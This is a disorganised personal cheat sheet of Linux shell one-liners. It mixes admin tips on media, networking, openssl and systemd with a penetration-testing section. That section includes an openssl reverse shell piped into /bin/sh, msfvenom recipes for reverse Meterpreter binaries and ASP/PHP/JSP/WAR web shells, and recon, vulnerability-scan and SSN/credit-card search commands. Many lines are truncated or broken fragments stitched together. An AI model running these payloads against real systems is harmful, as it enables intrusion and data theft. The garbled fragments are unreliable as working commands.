





Pull out hyperlinks from within a webpage:

grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u


Output it to a file:

cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
`for url in $(cat list.txt); do host $url; done










Generate Random Pass Ubuntu

date +%s | sha256sum | base64 | head -c 24 ; echo "@%&";
date +%s | sha1sum | base64 | head -c 12; echo "@%&";

	
Convert Imagick

for i in *.png; do convert "$i" "${i%.png}.jpg" && rm "$i" && echo "$i is converted."; done
for i in .png; do convert "$i" "${i%.}.jpg" ; done





Record Screen Ubuntu

ffmpeg -v warning -an -video_size 1366x768 -framerate 5 -f x11grab -i :0.0 myvid_$(date +%s).mp4*
ffmpeg -v warning -video_size 1920x1080 -framerate 5 -f x11grab -i :0.0 myvid_$(date +%s).mov
ffmpeg -f x11grab -follow_mouse centered -show_region 1 -framerate 5 -video_size 4cif -i :0.0 xmvid_$(date +%s).mov




# Capture video of a linux desktop

ffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq /tmp/out.mpg




Split audio file in 1 sec pieces FFMPEG

ffmpeg -i in.wav -map 0 -f segment -segment_time 1 -af "volume=6dB,equalizer=f=40:width_type=o:width=2:g=-7,areverse" -y dir/out%03d.wav



Cut Video

ffmpeg -i movie.mp4 -ss 00:00:03 -t 00:00:08 -async 1 cut.mp4




# output your microphone to a remote computer's speaker
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp



Timestamp

date +%s > 1552925792


TIMESTAMP=`date +%s`



REFERENCE=`git rev-parse HEAD`



# Use `curl -I 'https://download.mozilla.org/?product=firefox-latest&os=linux64&lang=en_US'` 


##   [?] Determine the latest stable version, 
##       and replace the tag in the URL below.





ip=$(curl -s https://checkip.amazonaws.com)




Available interfaces are:
+--------------------+
$(ip -br a | awk '{print $1}')
+--------------------+




echo -e "
+--------------------------------------------+
${BWhite}Server subnet = ${BRed}$server_subnet${Color_Off}
${BWhite}Server port = ${BRed}$listen_port${Color_Off}
${BWhite}Server public address = ${BRed}$server_public_address${Color_Off}
${BWhite}WAN Interface = ${BRed}$local_interface${Color_Off}
+--------------------------------------------+
"

read -r -p "WireGuard Interface: " wg_serv_iface


\















$(echo -n $2 | sha256sum | cut -c1-6)

read -p "(press enter to continue)"




SIGNED_SHA256SUM_BASE64=`mktemp /tmp/ruleset-signature.sha256.base64.XXXXXXXX`



SIGNED_SHA256SUM=`mktemp /tmp/ruleset-signature.sha256.XXXXXXXX`



echo $2 | xxd -r -p | openssl pkeyutl -sign -inkey $1 -pkeyopt digest:sha256 -pkeyopt rsa_padding_mode:pss -pkeyopt rsa_pss_saltlen:32 -out $SIGNED_SHA256SUM

cat $SIGNED_SHA256SUM | base64
cat $SIGNED_SHA256SUM | base64 | qrencode -o $SIGNED_SHA256SUM_BASE64_QR



eog $SIGNED_SHA256SUM_BASE64_QR 2>/dev/null



echo 'Hash for signing: '

sha256sum $2/default.rulesets.$TIMESTAMP.gz | cut -f1 -d' '


$(sha256sum $2/default.rulesets.$TIMESTAMP.gz | cut -f1 -d' ' | tr -d '\n' | sha256sum | cut -c1-6)



echo 'Paste in the data from the QR code, then type Ctrl-D:'
cat | tr -d '\n' > $SIGNED_SHA256SUM_BASE64


base64 -d $SIGNED_SHA256SUM_BASE64 > $2/rulesets-signature.$TIMESTAMP.sha256
openssl dgst -sha256 -sigopt rsa_padding_mode:pss -sigopt rsa_pss_saltlen:32 -verify $1 -signature $2/rulesets-signature.$TIMESTAMP.sha256 $2/default.rulesets.$TIMESTAMP.gz




openssl dgst -sha256 -sigopt rsa_padding_mode:pss -sigopt rsa_pss_saltlen:32 -sign $1 -out $2/rulesets-signature.$TIMESTAMP.sha256 $2/default.rulesets.$TIMESTAMP.gz








#verifyrecover using openssl
			openssl pkeyutl -verifyrecover -in $file_to_verify -inkey ~/.ssh/$verifying_key_file > $file_to_verify.recovered 
			
			
						#sign using openssl
			openssl pkeyutl -sign -in access -inkey ~/.ssh/$signing_key_file -out access.signed
			
			
						read -p "Press [Enter] to return to menu"
			
			
			
			#decrypt using openssl
			openssl pkeyutl -decrypt -in $file_to_decrypt -out $file_to_decrypt.decrypted -inkey ~/.ssh/$decryption_key_file
			echo ""
			
			
			#encrypt using openssl
			openssl pkeyutl -encrypt -pubin -in $file_to_encrypt -out $file_to_encrypt.encrypted -inkey ~/.ssh/$encryption_key_file

			
			















nmcli interactive editor
    nmcli connection edit 'Wired connection 2'.
    Usage is well documented from the editor.

nmcli command line interface
    nmcli connection modify 'Wired connection 2' setting.property value. See nmcli(1) for usage. For example you can change its IPv4 route metric to 200 using nmcli connection modify 'Wired connection 2' ipv4.route-metric 200 command.

Connection file
    In /etc/NetworkManager/system-connections/, modify the corresponding Wired connection 2.nmconnection file .
    Do not forget to reload the configuration file with nmcli connection reload.
	
	
	
	
nmcli examples



List nearby wifi networks:

nmcli device wifi list

Connect to a wifi network:

nmcli device wifi connect SSID password password

Connect to a hidden network:

nmcli device wifi connect SSID password password hidden yes

Connect to a wifi on the wlan1 wifi interface:

nmcli device wifi connect SSID password password ifname wlan1 profile_name

Disconnect an interface:

nmcli device disconnect ifname eth0

Reconnect an interface marked as disconnected:

nmcli connection up uuid UUID

Get a list of UUIDs:

nmcli connection show

See a list of network devices and their state:

nmcli device

Turn off wifi:

nmcli radio wifi off

	
	
	
Create a bridge named bridge-br0.

[root@host]# nmcli con add type bridge ifname br0

(2) Disable spanning tree protocol (STP)

[root@host]# nmcli con modify bridge-br0 bridge.stp no

(3) Set the IP address, etc. (adjust the parameters appropriately)

[root@host]# nmcli con modify bridge-br0 ipv4.method manual ipv4.address "192.168.199.100/24" ipv4.gateway "192.168.199.254"  ipv4.dns 8.8.8.8 ipv4.dns-search example.com

Note that, in CentOS 7.0, the syntax was 'ipv4.addresses 192.168.199.100/24 192.168.199.254'. This has been changed in the later minor versions.

(4) Connect the physical port enp0s25 to the bridge just created.

[root@host]# nmcli con add type bridge-slave ifname enp0s25 master bridge-br0






qrencode -t ASCIIi /etc/wireguard/${A_NAME}














# Update twitter via curl

curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml




# Mount folder/filesystem through SSH

sshfs name@server:/path/to/folder /path/to/mount/point




# Compare a remote file with a local file
ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
# Download an entire website
wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com




##-==========================================-##
##  [+] Clone a website to the local system.
##-==========================================-##
wget -r -nH $URL






Mirroring a web site with wget –spider






wget --no-cache --no-cookies --max-redirect=0 --timeout=20 -O









Scrape Images from 4chan Using Wget
wget -P pictures -nd -r -l 1 -H -D i.4cdn.org -A png,gif,jpg,jpeg,webm [thread-url]



Scrape Images from 8chan Using Wget

wget -P pictures -nd -r -l 1 -H -D media.8ch.net -A png,gif,jpg,jpeg,webm [thread-url]





apt-key adv --keyserver $KEYSERVER --recv-key $GPGKEY







for i in $GPGKEY; do apt-key list















# Generate a random number
NUM=$(cat /dev/urandom | head -n 10 | cksum | awk -F ' ' '{print $1}')



##-=============================================-##
##  [+] Shutdown a Windows machine from Linux

net rpc shutdown -I ipAddressOfWindowsPC -U username%password




##-==========================================-##
##  [+] A very simple and useful stopwatch

time read (ctrl-d to stop)


##-=======================================----===-##
##  [+] Put a console clock in top right corner

while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &









##-=================================================-##
##  [+] SSH connection through host in the middle

ssh -t reachable_host ssh unreachable_host


##-====================================================-##
##  [+] Check your unread Gmail from the command line

curl -u username --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /<name>/; print "$2\n" if /<(title|name)>(.*)<\/\1>/;'


##-==============================================-##
##  [+] Display the top ten running processes 
##   (Sorted by memory usage)
ps aux | sort -nk +4 | tail



##-===========================================-##
##  [+] List of commands you use most often

history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head


##-=================================================-##
##  [+] Close shell keeping all subprocess running
disown -a && exit




##-=================================================-##
##  [+] Sharing file through http 80 port
nc -v -l 80 < file.ext



##-=================================================-##
##  [+] Matrix Style
tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"


##-===================================-##
##  [+] Rip audio from a video file.

mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-file>



##-===============================================-##
##  [+] Kills a process that is locking a file.

fuser -k filename



##-====================================-##
##  [+] save command output to image

ifconfig | convert label:@- ip.png



##-==============================================-##
##  [+] Stream YouTube URL directly to mplayer

i="8uyxVmdaJ-w";mplayer -fs $(curl -s "http://www.youtube.com/get_video_info?&video_id=$i" | echo -e $(sed 's/%/\\x/g;s/.*\(v[0-9]\.lscache.*\)/http:\/\/\1/g') | grep -oP '^[^|,]*')



##-=========================================-##
##  [+] Graphical tree of sub-directories

ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'


# Job Control
^Z $bg $disown


##-=================================================-##
##  [+] intercept stdout/stderr of another process

strace -ff -e trace=write -e write=1,2 -p SOME_PID


strace -o $STRACE_OUTPUT_FILE "$@" && grep -oP '^.+?(?=\()' $STRACE_OUTPUT_FILE$




##-======================================-##
##  [+] Downloading NoScript extension

curl -L -f -# -O https://addons.mozilla.org/firefox/downloads/latest/noscript/addon-722-latest.xpi




## Control Volume Using Curl:



# Stop whatever is currently playing
curl "192.168.0.15:3000/api/v1/commands/?cmd=stop"

# Disable the repeat function so the bell cannot repeat
curl "192.168.0.15/api/v1/commands/?cmd=repeat&value=false"

# Set the volume to the desired level
curl "192.168.0.15/api/v1/commands/?cmd=volume&volume=85"

# Fire Reminder Bell
curl "192.168.0.15:3000/api/v1/commands/?cmd=playplaylist&name=ReminderBell"

# Clear the Queue now that it's finished so it doesn't play next time I go to use the queue
curl "192.168.0.15/api/v1/commands/?cmd=clearQueue"

# Wait for bell to finish playing
sleep 15



# Now we return to programming


# Set the volume to the desired level
curl "192.168.0.15/api/v1/commands/?cmd=volume&volume=60"

# Load the desired media and begin playing
curl "192.168.0.15:3000/api/v1/commands/?cmd=playplaylist&name=Wakeup"

# Re-enable the repeat function
curl "192.168.0.15/api/v1/commands/?cmd=repeat&value=true"








	do
		f_iptrule "-D" "${ban_chain} -i ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} src -j ${target_src}"
		f_iptrule "-D" "${ban_chain} -o ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} dst -j ${target_dst}"
	done



f_iptrule "-I" "${wan_input} -p udp --dport 67:68 --sport 67:68 -j RETURN"

f_iptrule "-A" "${wan_input} -j ${ban_chain}"

f_iptrule "-A" "${wan_forward} -j ${ban_chain}"

for dev in ${ban_dev}
do
	f_iptrule "${action:-"-A"}" "${ban_chain} -i ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} src -j ${target_src}"
done

f_iptrule "-I" "${lan_input} -p udp --dport 67:68 --sport 67:68 -j RETURN"

f_iptrule "-A" "${lan_input} -j ${ban_chain}"

f_iptrule "-A" "${lan_forward} -j ${ban_chain}"
for dev in ${ban_dev}
do
	f_iptrule "${action:-"-A"}" "${ban_chain} -o ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} dst -j ${target_dst}"
done











awk '{print $NF}'	looks only at the last word that was typed
sed 's/\./\\./g'	escapes the dot for use in grep. ex: tcp.options -> tcp\.options
sed "s/'//g"		removes single quotes

cut -d$'\t' -f 3		output is tab delimited, this grabs the 3rd field

tr '\n' ' '			replace new lines with a space.


cut -f 1 -d " "		grabs the first field

echo ${$Binary} 		pipes $Binary to next cmd






find . -name '*.[pP][dD][fF]'





Searching for credit card numbers, social security numbers, and bank accounts.

find dir1 dir2...  -type f -print0| \
xargs -0 grep -i -P '\b\d\d\d-\d\d-\d\d\d\d\b|\b\d\d\d\d-\d\d\d\d-\d\d\d\d-\d\d\d\d\b|\b\d\d\d\d-\d\d\d\d\d\d-\d\d\d\d\d\b|account number|account #'
The regular expressions I used are perl-compatible. See pcre(3) and PCREPATTERN(3) manual pages. The special characters are
\d – a digit
\b – a boundary – either a character, end of line, beginning of line, etc. – This prevents 1111-11-1111 from matching a SSN.

This matches the following patterns
\d\d\d-\d\d-\d\d\d\d – SSN
\d\d\d\d-\d\d\d\d-\d\d\d\d-\d\d\d\d – Credit card number
\d\d\d\d-\d\d\d\d\d\d-\d\d\d\d\d – AMEX credit card







Sorting PDF files by page count
I sorted the PDF files by page count using

for i in *.pdf
do
  NumPages=$(exiftool "$i" | sed -n '/Page Count/ s/Page Count *: *//p')
  printf "%d %s\n" "$NumPages" "$i"
done | sort -n | awk '{print $2}' >pdfSmallestFirst




Scanning Excel files
## I installed gnumeric, 
## and used the program ssconvert 
## to convert the Excel file into text files.

find . -name '*.xls' -o -name '*.xlsx' | \
while IFS= read file; do ssconvert -S "$file" "$file.%s.csv";done


## Converting Microsoft Word files into ASCII
## I used the following script to convert word files into ASCII


find . -name '*.do[ct]x' -o -name '*. | \
while IFS= read file; do unzip -p "$file" word/document.xml | \
sed -e 's/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g' >"$file.txt";done








 | cut -d: -f2 | cut -d ' ' -f1




tr ',' '\n' | sed 's/^[[:space:]]//g'

 | cut -d "=" -f 2-


 | while read pkg; do

 | xargs git add
  | xargs zcat 
 
 PID=$(pidof -s ${index})
	if [[ "${PID}" != "" ]]; then
 
 tee -a logfile.txt
 kill -9 $! 2>/dev/null


notify-send "$1" "$2"


https://github.com/richb-hanover/OpenWrtScripts




PINGHOST4="1.1.1.1"               # Cloudflare Anycast IPv4 DNS resolver
PINGHOST6="2606:4700:4700::1111"  # Cloudflare Anycast IPv6 DNS resolver



# ----- Start the testing -----
# Print baseline latency for IPv4 & IPv6 (no error if IPv6 not available)
echo "Testing from $CSN to $H"
echo "Measuring baseline latency to $PINGHOST4 and $PINGHOST6..."
fping -D -q -c 5 -4 $PINGHOST4 # ping five times
fping -D -q -c 5 -6 $PINGHOST6 # ping five times



# Use nearby anycast addresses for PINGHOST4 and PINGHOST6 to minimize base
#   latency measurements. Adding 3 msec of bloat to a 15 msec base is a
#   larger percentage change than 3 msec added onto 50 msec at the -H host
# See https://blog.cloudflare.com/dns-resolver-1-1-1-1/ for information
#   about Cloudflare's IPv4 & IPv6 anycast addresses










top -b | head -n 20





DHCPDISCOVER
DHCPOFFER
DHCPREQUEST
DHCPACK

Got DHCPv6 request
DHCPV6 CONFIRM IA_NA from 000100011e0e2bd2001c424f5860












ping $Domain
whois $IP
whois $Domain
dig $Domain
nmap -Pn -n -T4 --open -p- $Domain
nmap -Pn -n -T4 --open -p#,#,# -sCV $Domain
nmap -Pn -n -T4 --open -sU $Domain
dirb $Domain
gobuster dir -u $Domain -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
joomscan -u $Domain
nikto -h $Domain -port 443 -Format htm --output $Domain.htm
uniscan -u $Domain -qweds
wafw00f $Domain
whatweb $Domain
wpscan --url $Domain
sslscan $Domain
sslyze $Domain










##-=====================-##
##  [+] Steganography

steghide extract -sf picture.jpg

steghide info picture.jpg



##-===================-##
##  [+] SSL Testing


##-==================================================-##
##  [+] Proxy Enumeration (useful for open proxies)
##-==================================================-##
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html



##-==================================================-##
##  [+] 

nikto -useproxy http://$ip:3128 -h $ip









##-==================================================-##
##  [+] 


  if [ $(lsof -nPi | grep -i apache | grep -c ":80 (LISTEN)") -ge 1 ]; then
    echo '[Success] Apache2 is up and running!'
  else 
  
  
  
  
  
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


##-==================================================-##
##  [+] 


openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>






##-==========================-##
##  [+] Harvester - Flags
##-==========================-##
theharvester -d $Domain -l $Limit -b $DataSource


##-===================================================-##
##  [+] Harvester Data Source - All Search Engines
##-===================================================-##
theharvester -d url -l 500 -b all -b all = all search engines



##-=======================================-##
##  [+] Harvester Data Source - Google
##-=======================================-##
theharvester -d $Domain -l 500 -b google
theharvester -d $Domain -b google > google.txt

##-=======================================-##
##  [+] Harvester Data Source - Twitter
##-=======================================-##
theharvester -d $Domain -l 500 -b twitter


##-======================================================-##
##  [+] Use SHODAN database to query discovered hosts
##-======================================================-##
theharvester -d $Domain -h > $Domain-SHODAN-Query.txt





recon-ng
[recon-ng][default] > use recon/domains-contacts/whois_pocs
[recon-ng][default][whois_pocs] > show options
[recon-ng][default][whois_pocs] > set SOURCE $Domain
[recon-ng][default][whois_pocs] > run




recon-ng

use recon/domains-hosts/
show options
set source cnn.com
use recon/hosts-hosts/resolve
run







##-==================================-##
##  [+] Search for vulnerabilties:

use recon/domains-vulnerabilities/....















##-==========================-##
##  [+] Basic Recon Query:
##-==========================-##
dnsrecon -d “$Domain”



##-===============================-##
##  [+] Brute Force Recon Query:
##-===============================-##
dnsrecon -d “$Domain” -D “file path” -t std --xml “file” 




metagoofil -d “target domain” -t “file types” -l “# of results” -n “# of downloads” -o “specify directory to save in” -f “specify name and location of file save”



metagoofil -d owasp.org -t pdf,doc,ppt -l 200 -n 5 -o /root/Desktop/metagoofil/ -f /root/Desktop/metagoofil/result.html





metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o /root/Desktop/metagoofil/ -f /root/Desktop/metagoofil/result.html



    Let us understand the details of the command:
    -d to specify the target domain.
    -t to specify the file type you want metagoofil to locate and download.
    -l to limit the results to a search. By default, it is set to 200.
    -n to specify the number of files to download.
    -o to specify a directory to save download file.
    -f output file name and location.




nmap -iL targetlist.txt -sV -sS -T4 -p 1-10000

    "-iL" parameter tells nmap to pull IP's to search from the "targetlist.txt" file
    "-p" parameter tells nmap to only scan port 80
    "-sV" is used to try to detect operating system versions on targeted devices
    "-T4" is the speed in which the scan is conducted, T5 being the fastest T1 being the slowest.
    "-O" is used for Operating System detection



Using Fping to Discover Live Hosts




fping -g "target network address w/ cidr notation"

    "-g" is used to generate a target list from the netmask supplied above






Bash-loop one-liner: (Add an '&' at the end of the line to background each loop to speed it up)

for targets in $(echo x.x.x.{0..255} | tr ' ' '\n'); do ping -c 2 $targets; done


##-=======================-##
##  [+] Email Harvester

theharvester -d $Domain -b google >google.txt


##-==================-##
##  [+] Recon-ng
##-==================-##

root@kali:~# recon-ng
[recon-ng][default] > use recon/domains-contacts/whois_pocs
[recon-ng][default][whois_pocs] > show options
[recon-ng][default][whois_pocs] > set SOURCE $Domain
[recon-ng][default][whois_pocs] > run



Check against subdomains from a list: Create a list.txt full of names.

for ip in $(cat list.txt);do host $ip.website.com;done




##-=====================-##
##  [+] Zone transfer

root@kali:~# host -l $Domain <dns server address>

##-==================-##
##  [+] Clean it up:

host -t ns $Domain | cut -d " " -f 4


##-==================-##
##  [+] DNSRecon

dnsrecon -d $Domain -t axfr


##-==================-##
##  [+] DNSEnum

dnsenum $Domain



DNS Nmap zone transfer

nmap --script=dns-zone-transfer -p 53 ns1.website.com







name of association	URL
AFRINIC	Http://www.afrinic.net
APNIC	Http://www.apnic.net
ARIN	Http://ws.arin.net
IANA	Http://www.iana.com
ICANN	Http://www.icann.org
LACNIC	Http://www.lacnic.net
NRO	Http://www.nro.net
RIPE	Http://www.ripe.net
InterNic	Http://www.internic.net






theharvester -d $Domain -l 300 -b google -f $Domain.html




theharvester -d microsoft.com -l 500 -b google -h myresults.html
theharvester -d microsoft.com -b pgp
theharvester -d microsoft -l 200 -b linkedin
theharvester -d apple.com -b googleCSE -l 500 -s 300


theharvester -d $Domain -l 500 -b google -h $Domain.html
theharvester -d $Domain -b pgp
theharvester -d $Domain -l 200 -b linkedin
theharvester -d $Domain -b googleCSE -l 500 -s 300

$Domain

metagoofil -d sina.com -t pdf -l 200 -o test -f 1.html

metagoofil.py -d apple.com -t doc,pdf -l 200 -n 50 -o applefiles -f results.html
metagoofil.py -h yes -o applefiles -f results.html (local dir analysis)
  
  
  


Query database

query select * from hosts where host like '%example.com%' order by ip_address
set SOURCE query select host from hosts where host like '%sina.com.cn%' That is, you can execute the data language for query and parameter setting.

Using modules

search google
返回:
  Recon
    recon/domains-hosts/google_site_api
    recon/domains-hosts/google_site_web

use recon/domains-hosts/google_site_web
show option         //查看模块选项
show info           //查看模块详细信息
set SOURCE sina.com  //设置模块选项
run                  //执行模块

search report
use reporting/html
show option
set FILENAME  /root/Desktop/example.html
run










    Listar payloads

msfvenom -l payloads

Payloads de binarios

    Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f exe > shell.exe

    Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f elf > shell.elf

    Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f macho > shell.macho

Payloads de binarios ejecutable para el lenguaje de programación del script que estés desarrollando (copiar la salida y pegarla en tu script):

    Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f LENGUAJE-DE-TU-SCRIPT

    Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f LENGUAJE-DE-TU-SCRIPT

    Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f LENGUAJE-DE-TU-SCRIPT

Web payloads

    Shell en ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f asp > shell.asp

    Shell en PHP (IMPORTANTE: Añadir en el archivo resultante <?php y ?>)

msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=YYYY -e php/base64 -f raw > shell.php

    Shell en JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f raw > shell.jsp

    Shell en WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=X.X.X.X LPORT=YYYY -f war > shell.war

Scripting

    Shell en Python

msfvenom -p cmd/unix/reverse_python LHOST=X.X.X.X LPORT=YYYY -f raw > shell.py

    Shell en Bash

msfvenom -p cmd/unix/reverse_bash LHOST=X.X.X.X LPORT=YYYY -f raw > shell.sh






Port Scanning

nc connect/tcp scanning:

root@kali:~# nc -nvv -w 1 -z <ip> <port-range>

nc udp scanning

root@kali:~# nc -nv -u -z -w 1 <ip> <port-range>







NMAP

Ping scan and output to a grepable file

root@kali:~# nmap -sn -oG <filename.txt> <ip or range>

Cleanup results:

root@kali:~# grep Up <filename.txt> | cut -d " " -f 2 > <final-filename.txt>

Perform a quick service discovery on a list of IPs and output to another list against top 10 ports

root@kali:~# nmap -v -sV --top-ports=10 -iL <inputfilename.txt> -oG <outputfilename.txt>



Quick web sweep:

root@kali:~# nmap -p 80 <iprange>




Sometimes if a host is UP but reports down. Add --disable-arp-ping:

nmap -v -p 445 --script=smb-vuln-* --script-args=unsafe-1 <ip> **--disable-arp-ping**



SMB Enumeration

Check for smb vuln:

nmap -v -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 -iL <filename.txt>





btscan (NetBIOS scanner)

nbtscan -f <filename.txt>
nbtscan -r <ip/cidr>



Enum4linux bash-loop:

for targets in $(cat <filename.txt>); do enum4linux $targets; done







0x04 HTTPS vulnerability scan


openssl

openssl s_client connect www.baidu.com:443


openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.baidu.com:443




sslscan

Automatically identify ssl configuration errors, expired protocols, outdated cipher suite, default check crime, heartbleed vulnerability, green for security, red, yellow to draw attention



sslscan --tlsall www.baidu.com:443


sslscan --show-certificate --no-ciphersuites www.baidu.com



sslyze

Check the ssl outdated version, check the cipher suite with weak points, scan the multi-site, support reading from the file, check whether support for callback recovery

sslyze --regular www.baidu.com:443




nmap --script=ssl-enum-ciphers.nse www.baidu.com





Online inquiry 

https://www.ssllabs.com/ssltest





# Start socat
if [ -z "${ALLOWED_RANGE}" ]; then
	socat TCP-L:5000,fork,reuseaddr SOCKS4A:127.0.0.1:${TOR_SITE}:${TOR_SITE_PORT},socksport=9050
else
	socat TCP-L:5000,fork,reuseaddr,range=${ALLOWED_RANGE} SOCKS4A:127.0.0.1:${TOR_SITE}:${TOR_SITE_PORT},socksport=9050
fi



docker run -d -p 80:5000 -e "ALLOWED_RANGE=10.0.0.0/8" -e "TOR_SITE=<target_site.onion>" -e "TOR_SITE_PORT=<target_site_port>" --name socator arno0x0x/socator

To start the image in foreground:

docker run -ti -p 80:5000 -e "TOR_SITE=<target_site.onion>" -e "TOR_SITE_PORT=<target_site_port>" --name socator arno0x0x/socator



















/etc/init.d/iptables status



iptables -L -n | grep -i ${shadowsocksport



iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport ${shadowsocksport} -j ACCEPT
iptables -I INPUT -m state --state NEW -m udp -p udp --dport ${shadowsocksport} -j ACCEPT
/etc/init.d/iptables save
/etc/init.d/iptables restart



iptables -N udp-flood iptables -A OUTPUT -p udp -j udp-flood iptables -A udp-flood -p udp -m limit --limit 50/s -j RETURN iptables -A udp-flood -j LOG --log-level 4 --log-prefix 'UDP-flood attempt: ' iptables -A udp-flood -j DROP





systemctl status firewalld

firewall-cmd --permanent --zone=public --add-port=${shadowsocksport}/tcp
firewall-cmd --permanent --zone=public --add-port=${shadowsocksport}/udp
firewall-cmd --reload




 CHEF-KOCH-WireGuard-Config




brctl show
ip link show $TUNFISH_BRIDGE_DEVICE
#brctl showstp $TUNFISH_BRIDGE_DEVICE | grep flags

brctl addif $TUNFISH_BRIDGE_DEVICE $link
        ethtool -K $link tx off >>/dev/null 2>&1

# Turn on STP
echo -e "INFO:  Turning on Spanning Tree Protocol (STP)"
brctl stp $TUNFISH_BRIDGE_DEVICE on



# Adjust forward delay to improve recovery speed. Default: 15.0
echo -e "INFO:  Adjusting forward delay to improve recovery speed"
brctl setfd $TUNFISH_BRIDGE_DEVICE $TUNFISH_BRIDGE_FORWARD_DELAY



























































































dumpe2fs -h /dev/sda1 | grep -i 'mount count'

tune2fs -c 20 /dev/sda1


fsck.mode=force








earlyprintk=vga,keep			## prints kernel messages very early in the boot process, in case the kernel would crash before output is shown. You must change vga to efi for EFI systems
log_buf_len=16M					## allocates a larger (16MB) kernel message buffer, to ensure that debug output is not overwritten
	
bootmem_debug




	
	
slub_debug=P					## Allow allocator validation checking to be enabled

page_poison=1					## Wipe higher-level memory allocations when they are freed (needs "page_poison=1"













# List of GPG keys required for building grsecurity-patched kernel.
grsecurity_build_gpg_keys:
  - name: Greg Kroah-Hartman GPG key (Linux stable release signing key)
    fingerprint: 647F28654894E3BD457199BE38DBBDC86092693E
  - name: kernel.org checksum autosigner GPG key
    fingerprint: B8868C80BA62A1FFFAF5FDA9632D3A06589DA6B1
  - name: Bradley Spengler GPG key (grsecurity maintainer key)
    fingerprint: DE9452CE46F42094907F108B44D1C0F82525FE49











	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
ournalctl -u ip-accounting-test -n 1 -o verbose	
	
	
	
journalctl -u ip-accounting-test MESSAGE_ID=ae8f7b866b0347b9af31fe1c80b127c0

systemd-run -p IPAccounting=yes --wait wget https://cfp.all-systems-go.io/en/ASG2017/public/schedule/2.pdf


systemd-run -p IPAddressDeny=any -p IPAddressAllow=8.8.8.8 -p IPAddressAllow=127.0.0.0/8 -t /bin/sh

systemctl set-property system.slice IPAddressDeny=any IPAddressAllow=localhost
# systemctl set-property apache.service IPAddressAllow=10.0.0.0/8


systemd-resolve 


systemd-run --pipe -p IPAddressDeny=any -p IPAddressAllow=85.214.157.71 -p IPAddressAllow=2a01:238:43ed:c300:10c3:bcf3:3266:da74 -p DynamicUser=yes curl http://0pointer.de/public/casync-kinvolk2017.pdf | lp


systemd-run --pipe -p IPAddressDeny=any \
                     -p IPAddressAllow=85.214.157.71 \
                     -p IPAddressAllow=2a01:238:43ed:c300:10c3:bcf3:3266:da74 \
                     -p DynamicUser=yes \
                     curl http://0pointer.de/public/casync-kinvolk2017.pdf | lp




# systemd-nspawn -L system_u:object_r:svirt_sandbox_file_t:s0:c0,c1 -Z system_u:system_r:svirt_lxc_net_t:s0:c0,c1 -D /srv/container /bin/sh




systemd-run --pty --property=DynamicUser=yes --property=StateDirectory=wuff /bin/sh

systemd-run --pty --property=DynamicUser=yes --property=StateDirectory=wuff /bin/sh


# systemd-nspawn -bi foobar.raw


qemu-kvm -m 512 -smp 2 -bios /usr/share/edk2/ovmf/OVMF_CODE.fd -drive format=raw,file=foobar.raw






--property=
systemctl set-property.




--overlay=, --overlay-ro=


--capability=

    List one or more additional capabilities to grant the container. Takes a comma-separated list of capability names, see capabilities(7) for more information. Note that the following capabilities will be granted in any way: CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_DAC_READ_SEARCH, CAP_FOWNER, CAP_FSETID, CAP_IPC_OWNER, CAP_KILL, CAP_LEASE, CAP_LINUX_IMMUTABLE, CAP_NET_BIND_SERVICE, CAP_NET_BROADCAST, CAP_NET_RAW, CAP_SETGID, CAP_SETFCAP, CAP_SETPCAP, CAP_SETUID, CAP_SYS_ADMIN, CAP_SYS_CHROOT, CAP_SYS_NICE, CAP_SYS_PTRACE, CAP_SYS_TTY_CONFIG, CAP_SYS_RESOURCE, CAP_SYS_BOOT, CAP_AUDIT_WRITE, CAP_AUDIT_CONTROL. Also CAP_NET_ADMIN is retained if --private-network is specified. If the special value "all" is passed, all capabilities are retained.
--drop-capability=



--network-veth or --network-bridge=


--network-ipvlan=


--network-ipvlan= implies --private-network.
--private-users=





